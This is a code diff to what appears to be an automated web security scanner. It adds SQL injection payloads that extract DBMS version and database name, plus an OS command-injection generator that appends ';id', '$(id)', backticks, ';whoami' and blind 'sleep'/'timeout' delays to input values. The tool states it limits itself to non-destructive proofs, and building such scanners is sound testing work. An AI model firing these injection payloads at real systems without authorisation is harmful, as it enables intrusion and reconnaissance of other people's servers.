@@ -1,10 +1,13 @@
-"""SQL and NoSQL injection generators: sqli, nosqli.
+"""Injection generators: sqli, nosqli, command_injection.
 
-Non-destructive only: no DROP/DELETE/UPDATE/INSERT, no stacked writes, no data
-extraction beyond a DBMS version string identified through a conditional delay,
-no heavy-query denial of service. Confirmation is boolean-differential or
-time-based (never an error message alone). The control (case 0) is the timing
-baseline, sent three times so a delay is measured against a real median.
+Non-destructive only: no DROP/DELETE/UPDATE/INSERT, no stacked writes, no
+heavy-query denial of service, and no row extraction. For a PoC the generators
+surface only DB *metadata* (version / database name), which is not user data,
+and command_injection runs only read-only identity probes (id / whoami) or a
+benign delay (sleep) for a timing proof. Boolean SQLi is judged by the response
+differential, never by a status flip: a true/false pair can be two 200s whose
+bodies differ. The control (case 0) is the timing/response baseline, sent three
+times so a delay is measured against a real median.
 """
 
 from __future__ import annotations
@@ -12,6 +15,12 @@ from __future__ import annotations
 from .base import Ctx, TestCase
 
 GENERATORS: dict = {}
+
+# A distinctive DBMS version/banner fingerprint. If this appears in a response after an extraction
+# payload, the injection surfaced database metadata (a reportable PoC) -- it is specific enough not
+# to match ordinary page text.
+_VERSION_RX = (r"(?is)(?:MariaDB|MySQL|PostgreSQL|Microsoft SQL Server|Oracle Database|SQLite)\b.{0,60}?\d+\.\d+"
+               r"|XPATH syntax error: '~|\b\d+\.\d+\.\d+-(?:MariaDB|ubuntu|log)\b")
 
 
 def _gen(name):
@@ -208,6 +217,30 @@ def gen_sqli(ctx: Ctx) -> list[TestCase]:
                               negative=f"the delay payload in the {to} location does not slow the response",
                               rung="time_based", description=f"time-based from the {to} location"))
         n += 1
+
+    # metadata extraction (PoC): surface the DBMS version / database name into the response. This is
+    # metadata, never user rows, so it stays inside Rule 0. Error-based payloads leak the banner in
+    # the error text; UNION payloads place it in the result set. The positive is the version
+    # fingerprint, which is specific enough not to fire on ordinary page content.
+    q = "'" if ctx.value_type != "int" else ""
+    end = "-- -" if q else "-- -"
+    extract = [
+        ("mysql_error", f"{base}{q} AND extractvalue(1,concat(0x7e,version(),0x7e)){end}"),
+        ("postgres_cast", f"{base}{q} AND 1=CAST(version() AS int){end}"),
+        ("mssql_convert", f"{base}{q} AND 1=CONVERT(int,@@version){end}"),
+        ("union_version", f"{base}{q} UNION SELECT @@version{end}" if ctx.value_type != "int" else f"{base} UNION SELECT @@version{end}"),
+        ("union_dbname", f"{base}{q} UNION SELECT database(){end}" if ctx.value_type != "int" else f"{base} UNION SELECT database(){end}"),
+    ]
+    for variant, payload in extract:
+        cases.append(TestCase(case_no=n, technique=f"sqli.extract.{variant}", payload=payload,
+                              mutation=[{"op": "set_input", "value": payload, "raw": False}],
+                              positive={"type": "all", "of": [
+                                  {"type": "body_regex", "pattern": _VERSION_RX},
+                                  _NOT_CLIENT_REJECT]},
+                              negative=f"the {variant} extraction payload surfaces no DBMS version or database-name banner in the response",
+                              rung="data_extraction",
+                              description=f"metadata extraction (version / db name): {variant}"))
+        n += 1
     return cases
 
 
@@ -279,4 +312,63 @@ def gen_nosqli(ctx: Ctx) -> list[TestCase]:
                           negative="the $where clause is treated as a literal, so nothing changes",
                           rung="operator_injection", description="$where operator (always-true predicate, no side effect)"))
     n += 1
+    return cases
+
+
+# Service-account names whose fresh appearance in a response is a strong `whoami` signal (unlikely
+# in ordinary page text, unlike a bare "root"). Anchored to a line start to avoid substring matches.
+_WHOAMI_RX = r"(?im)^\s*(?:www-data|nt authority\|iis apppool\|daemon|nobody|_www|postgres|mysql|apache)\b"
+# `id` output is unambiguous: uid=NNN(name) ... gid=NNN. This never appears in normal content.
+_ID_RX = r"uid=\d+\([^)]*\)[^\n]{0,80}gid=\d+"
+# Benign delay (seconds). A timing proof uses a conditional-free delay well below any DoS threshold.
+_RCE_DELAY = 5
+
+
+@_gen("command_injection")
+def gen_command_injection(ctx: Ctx) -> list[TestCase]:
+    """OS command injection, proved non-destructively. Output cases run `id`/`whoami` (read-only
+    identity probes) and look for their unmistakable output; blind cases run a benign `sleep`/
+    `timeout` delay and measure it against the control median. No cat/curl/rm/write/exfil, ever --
+    the safety screen enforces that every payload here declares a benign extra.rce_cmd."""
+    base = ctx.sample_value or "1"
+    acting = ctx.acting_principal
+    cases: list[TestCase] = []
+    cases.append(TestCase(case_no=0, technique="command_injection.control.baseline", payload=base,
+                          mutation=[{"op": "set_input", "value": base}], is_control=True, repeat=3, principal=acting,
+                          positive={"type": "matches_base", "max_len_ratio": 0.5},
+                          negative="the unmodified request does not return the expected baseline, so the tooling is broken",
+                          description="control: timing and response baseline (3 repeats)"))
+    n = 1
+
+    def out_case(family, variant, inject, cmd, rx):
+        return TestCase(case_no=n, technique=f"command_injection.{family}.{variant}", payload=base + inject,
+                        mutation=[{"op": "set_input", "value": base + inject, "raw": False}],
+                        extra={"rce_cmd": cmd}, principal=acting,
+                        positive={"type": "body_regex", "pattern": rx},
+                        negative=f"the {family}/{variant} injection of `{cmd}` produces no command output in the response",
+                        rung="command_output", description=f"command output via {family}: `{cmd}`")
+
+    # output-based: run `id` (and whoami) through the common shell separators, detect the output.
+    for family, variant, inject in [("semicolon", "id", ";id"), ("pipe", "id", "|id"), ("amp", "id", "&&id"),
+                                    ("subshell", "id", "$(id)"), ("backtick", "id", "`id`"), ("newline", "id", "\nid")]:
+        cases.append(out_case(family, variant, inject, "id", _ID_RX))
+        n += 1
+    for family, variant, inject in [("semicolon", "whoami", ";whoami"), ("newline", "whoami", "\nwhoami")]:
+        cases.append(out_case(family, variant, inject, "whoami", _WHOAMI_RX))
+        n += 1
+
+    # blind: a benign delay proves execution when there is no echoed output. Measured against the
+    # control median; two repeats so a one-off slow response does not read as a hit.
+    blind = [("blind", "sleep_semicolon", f";sleep {_RCE_DELAY}", "sleep"),
+             ("blind", "sleep_subshell", f"$(sleep {_RCE_DELAY})", "sleep"),
+             ("blind", "sleep_pipe", f"|sleep {_RCE_DELAY}", "sleep"),
+             ("blind", "timeout_windows", f"& timeout /t {_RCE_DELAY}", "timeout")]
+    for family, variant, inject, cmd in blind:
+        cases.append(TestCase(case_no=n, technique=f"command_injection.{family}.{variant}", payload=base + inject,
+                              mutation=[{"op": "set_input", "value": base + inject, "raw": False}], repeat=2,
+                              extra={"rce_cmd": cmd}, principal=acting,
+                              positive={"type": "elapsed_over_baseline", "min_ms": _RCE_DELAY * 1000 - 1500, "baseline_case": 0},
+                              negative=f"the `{cmd}` delay via {variant} does not slow the response versus the baseline",
+                              rung="blind_timing", description=f"blind command injection via {variant}: `{cmd} {_RCE_DELAY}`"))
+        n += 1
     return cases
